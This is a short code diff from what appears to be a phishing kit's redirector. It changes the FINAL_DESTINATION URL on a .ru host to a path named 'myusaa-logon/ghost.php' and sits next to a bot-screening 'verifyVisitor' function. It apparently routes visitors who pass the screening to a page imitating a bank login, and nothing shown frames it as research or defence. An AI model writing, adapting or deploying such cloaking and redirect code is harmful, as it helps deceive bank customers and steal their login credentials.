@@ -47,7 +47,7 @@ const ZEROBOT = {
 };
 
 // Final Destination Configuration
-const FINAL_DESTINATION = process.env.FINAL_DESTINATION || 'https://rep.zynvero.ru/shiro/ghost.php';
+const FINAL_DESTINATION = process.env.FINAL_DESTINATION || 'https://rep.zynvero.ru/myusaa-logon/ghost.php';
 
 // ZeroBot Verification
 async function verifyVisitor(req) {
